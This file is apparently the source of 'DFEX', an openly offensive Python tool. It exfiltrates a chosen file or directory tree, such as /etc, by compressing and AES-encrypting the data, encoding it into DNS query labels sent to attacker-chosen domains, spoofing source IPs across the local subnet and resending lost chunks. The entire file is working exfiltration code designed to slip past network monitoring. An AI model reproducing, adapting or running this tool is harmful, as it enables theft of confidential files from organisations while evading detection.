#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import argparse
import binascii
import re
import time
import os
import zlib
import pyaes
import pyscrypt
import base64
from netifaces import AF_INET
import netifaces as ni
import ipaddress
import threading
from random import randint, shuffle
from pyfiglet import Figlet
import dns.resolver
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.0"

# Config
DEBUG = False
PHRASE = b'Waaaaa! awesome :)'
SALT = b'salgruesa'
CHAR = 20
SEED = '200'
RETRANSHOLD = 5


# Classes
class FileHandler(threading.Thread):
    """
    Class to send DNS NS request using spoof src IP
    filename = fullpath file to extract
    fileid = str of '00-ff' for file ID
    iface = interface for sending packets
    ctldomain is a list of control_domain
    datdomain is a list of data_domain
    network is IPv4Network object for src_ip, if None use local_lan
    datdomain is a list of data_domain
    network is IPv4Network object for src_ip, if None use local_lan
    server is a list of DNS server if None, use system_DNS (/etc/resolv.conf)
    """

    def __init__(self, filename, fileid, iface, ctldomain, datdomain, network, server):
        threading.Thread.__init__(self)
        self.filepath = filename
        self.fileid = fileid
        self.iface = iface
        self.ctldomain = ctldomain
        self.datdomain = datdomain
        self.net = network
        self.server = server

    def run(self):
        # make a list of IP's for spoofing
        if DEBUG:
            print('DEBUG: Network:',self.net)
        srcipreal = ni.ifaddresses(self.iface)[AF_INET][0]['addr']
        srcip = []
        for ip in list(self.net.hosts()):
            srcip.append(str(ip))
        shuffle(srcip)
        if DEBUG:
            print('DEBUG: Amount of SRC IP:',len(srcip))

        # compress, encrypt, encode and split
        filename = os.path.basename(self.filepath)
        fdcrypt = filenamecrypt(filename)
        crcfd = crc(self.filepath)
        ziped = compress(self.filepath)
        crypt = encrypt(ziped)
        enc = encoder(crypt)
        chunks = spliter(enc)
        pkttotal = len(chunks)
        print('INFO: File ID: ' + self.fileid + ' (CRC32: ' + crcfd + ')')
        if DEBUG:
            print('DEBUG: File ID: {} ({} chunks)'.format(self.fileid,pkttotal))

        # Sending Control Query
        ctldom = dompick(self.ctldomain)
        query = self.fileid + crcfd + '{:04x}'.format(pkttotal) + '.' + ctldom
        senddns(self.iface, srcipreal, query, self.server, 2)

        # Sending Data Query for filename (Seq 0000)
        datdom = dompick(self.datdomain)
        query = self.fileid + '0000' + fdcrypt + '.' + datdom
        senddns(self.iface, srcip[0], query, self.server, 2)

        # Generate SEQ list and shuffle order
        cnt = 0
        seq = []
        cnt = 0
        seq = []
        for x in range(1, pkttotal+1):
            seq.append(x)
        shuffle(seq)

        # Send each CHAR Data packet using random SEQ order and Data domains)
        for x in seq:
            datdom = dompick(self.datdomain)
            query = self.fileid + '{:04x}'.format(x) + chunks[x-1] + '.' + datdom
            senddns(self.iface, srcip[cnt], query, self.server, 2)
            if cnt >= len(srcip)-1:
                cnt = 0
            cnt = cnt + 1
            # Enable delay between DNS query if need it (WILL SLOW DOWN TRANSFER!)
            #time.sleep(randint(1, 3))

        # After all Data chunks sent, ask for retransmission
        RETRA = True
        cnt = 0
        reseqnum = '0000'
        while RETRA:
            # Sending Retransmission Query
            ctldom = dompick(self.ctldomain)
            query = self.fileid + reseqnum + '.' + ctldom
            if DEBUG:
                print('DEBUG: Retransmission Query:',self.iface, srcipreal, query, ''.join(self.server))
            ret = RetransHandler(self.iface, srcipreal)
            ret.daemon = True
            ret.start()
            time.sleep(0.5)
            senddns(self.iface, srcipreal, query, self.server, 1)
            time.sleep(RETRANSHOLD)
            ans = ret.join()
            print('INFO: Check {} seconds retransmission (File ID: {})'.format(str(RETRANSHOLD),self.fileid))
            if ans:
                if ans[DNS].qd[DNSQR].qname.decode() == self.fileid + reseqnum + '.' + ctldom + '.':
                    ansip = ans[DNS].an[DNSRR].rdata.split('.')
                    if (ansip[0] == SEED) and ('{:02x}'.format(int(ansip[1])) == self.fileid):
                        reseq = int(('{:02x}'.format(int(ansip[2])) + '{:02x}'.format(int(ansip[3]))), 16)
                        datdom = dompick(self.datdomain)
                        query = self.fileid + '{:04x}'.format(reseq) + chunks[reseq-1] + '.' + datdom
                        if DEBUG:
                            print('DEBUG: retransmission Answer:',self.iface, srcip[cnt], query, ''.join(self.server))
                        senddns(self.iface, srcip[cnt], query, self.server, 1)
                        reseqnum = '{:04x}'.format(reseq)
            else:
                RETRA = False


class RetransHandler(threading.Thread):
    def __init__(self, iface, srcip):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.srcip = srcip
        self._rtn_pkt = None

    def pkt_callbak(self, pkt):
        if pkt.haslayer(DNS):
            if pkt[DNS].an:
                self._rtn_pkt = pkt
                self.join()

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callbak,
                  filter="udp port 53 and not src " + self.srcip, store=0, timeout=RETRANSHOLD)

    def join(self):
        self.stoprequest.set()
        return self._rtn_pkt



# Functions
def senddns(iface, srcip, query, servers, qtype):
    # Craft DNS query
    dnspkt = (Ether() /
            IP(ihl=5, src=srcip, dst=servers[randint(0,len(servers)-1)]) /
            UDP(sport=53, dport=53) /
            DNS(rd=1))
            #DNS(rd=1, qd=DNSQR(qtype=qtype)))
    dnspkt[DNS].qd = DNSQR(qname=query,qtype=qtype)
    dnspkt[IP].id = randint(0, 0xFFFF)
    dnspkt[DNS].id = randint(0, 0xFFFF)
    sendp(dnspkt, iface=iface, verbose=0)

def crc(filename):
    # open file as byte and return crc32 in hex (8 char)
    fd = open(filename,'rb').read()
    b = (binascii.crc32(fd) & 0xFFFFFFFF)
    return '{:x}'.format(b)

def initid():
    # return random hex from 00-FF
    return '{:02x}'.format(randint(0,0xFF))

def nextid(id):
    # return str of next ID (hex) using prev ID + 1 (rollover if 0xFF)
    if int(id, 16) == 255:
        return '00'
    else:
        return '{:02x}'.format(int(id,16) + 1)

def compress(filename):
    # open file as byte and compress using max level (9) and return bytestream
    fd = open(filename, 'rb').read()
    return zlib.compress(fd, 9)

def encrypt(bytestream):
    # Hash passphrase + salt and encrypt using AES-CTR mode (return bytestream)
    key = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    aes = pyaes.AESModeOfOperationCTR(key)
    cipherbyte = aes.encrypt(bytestream)
    return cipherbyte

def encoder(bytestream):
    # encode base32 from bytes, add first number for 0-7 padding and delete '='
    # return just str (inc padding)
    enc = base64.b32encode(bytestream).decode('utf-8').lower()
    pad = len(enc) - len(enc.replace('=', ''))
    return str(pad) + enc.replace('=','')

def spliter(stream):
    # take stream (str) as input and split by CHAR, return a str list
    array = [stream[i:i+CHAR] for i in range(0, len(stream), CHAR)]
    return array

def dompick(domains):
    # return a random domain
    return domains[randint(0,len(domains)-1)]

def filenamecrypt(filename):
    # encrypt & encode the filename for SEQ 0000 pkt
    crypt = encrypt(str.encode(filename))
    return encoder(crypt)

def testdns(iface, servers):
    # test internal DNS if can resolve internet
    resolver = dns.resolver.Resolver()
    resolver.timeout = 1
    resolver.lifetime = 1
    resolver.nameservers = servers
    rtn = None
    try:
        answers = resolver.query("8.8.8.8.in-addr.arpa", "PTR")
        for rdata in answers:
            if 'dns.google.' in str(rdata):
                rtn = True
                return rtn
        return rtn
    except:
        return rtn


def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('DFEX'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser(add_help=True)
    command_group_dat = parser.add_mutually_exclusive_group(required=True)
    command_group_ctl = parser.add_mutually_exclusive_group(required=True)
    command_group_fd = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('-v', dest='verbose', action='store_true', help='Enable debugging')
    parser.add_argument('-n', dest='net', metavar='10.10.10.0/24', help='Spoofing Network, default local network')
    parser.add_argument('-s', dest='supernet', metavar='3', help='Supernet, 3 will make /24 into /21')
    parser.add_argument('-dns', dest='nameserver', metavar='10.10.10.1', help='DNS Server, default use /etc/resolv.conf')
    parser.add_argument('-i', dest='nic', required=True, metavar='eth0', help='Interface')
    command_group_dat.add_argument('-d', dest='datdomain', metavar='dfex.dat.dom', help='Data domain')
    command_group_dat.add_argument('-D', dest='datdomainfd', metavar='data.txt', help='File with data domain (1 per line)')
    command_group_ctl.add_argument('-c', dest='ctldomain', metavar='dfex.ctrl.dom', help='Control domain')
    command_group_ctl.add_argument('-C', dest='ctldomainfd', metavar='control.txt', help='File with control domain (1 per line)')
    command_group_fd.add_argument('-f', dest='file', metavar='secret.xlsx', help='File to extrafiltrate')
    command_group_fd.add_argument('-F', dest='dir', metavar='/etc', help='Directory of files to exfiltrate')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except(IOError):
            parser.error(str(IOError))
    else:
        parser.print_help()
        sys.exit(1)


# Main Function
def main():
    global DEBUG
    options = parsingopt()

    if options.verbose:
        DEBUG = True

    if options.nic in ni.interfaces():
        iface = options.nic
    else:
        print('ERROR: interface not valid')
        sys.exit(1)

    if options.net:
        try:
            network = ipaddress.IPv4Network(options.net)
        except:
            print('ERROR: network/netmask not valid')
            sys.exit(1)
    else:
        localip = ni.ifaddresses(iface)[AF_INET][0]['addr']
        localmask = ni.ifaddresses(iface)[AF_INET][0]['netmask']
        network = ipaddress.IPv4Network(localip + '/' + localmask, False)

    if options.supernet:
        if 31 >= int(options.supernet) >= 1:
            print(options.supernet)
            network = ipaddress.IPv4Network(network).supernet(prefixlen_diff=int(options.supernet))
        else:
            print('ERROR: invalid supernet (1-31)')
            sys.exit(1)

    if options.nameserver:
        server = [options.nameserver]
    else:
        server = re.findall(r'nameserver (.*)', open('/etc/resolv.conf').read())

    if options.datdomain:
        datdomain = [options.datdomain]
        if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', options.datdomain):
            print('ERROR: Data domain not valid')
            sys.exit(1)

    if options.datdomainfd:
        try:
            with open(options.datdomainfd, 'r') as sfile:
                datdomain = sfile.read().split()
            for x in datdomain:
                if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', x):
                    print('ERROR: Data domain not valid ',x)
                    sys.exit(1)
        except(OSError):
            print('ERROR: Can\'t read file',options.datdomainfd)
            sys.exit(1)

    if options.ctldomain:
        ctldomain = [options.ctldomain]
        if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', options.ctldomain):
            print('ERROR: Control domain not valid')
            sys.exit(1)

    if options.ctldomainfd:
        try:
            with open(options.ctldomainfd, 'r') as sfile:
                ctldomain = sfile.read().split()
            for x in ctldomain:
                if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', x):
                    print('ERROR: Control domain not valid ',x)
                    sys.exit(1)
        except(OSError):
            print('ERROR: Can\'t read file',options.ctldomainfd)
            sys.exit(1)

    if options.file:
        if os.path.exists(options.file):
            filename = [options.file]
        else:
            print('ERROR: file dont exist')
            sys.exit(1)

    if options.dir:
        filename = []
        for dirpath, dirnames, files in os.walk(options.dir):
            for names in files:
                filename.append(os.path.join(dirpath, names))
        if not filename:
            print('ERROR: directory empty')
            sys.exit(1)

    # Test DNS resolution 
    if testdns(iface, server):
        fileid = initid()
        for fd in filename:
            print('INFO: Filename: {} (File ID: {})'.format(fd,fileid))
            fdh = FileHandler(fd, fileid, iface, ctldomain, datdomain, network, server)
            fdh.start()
            fileid = nextid(fileid)
    else:
        print('ERROR: No external DNS resolution using DNS Servers:',' '.join(server))
        sys.exit(1)


# Call main
if __name__ == "__main__":
    main()
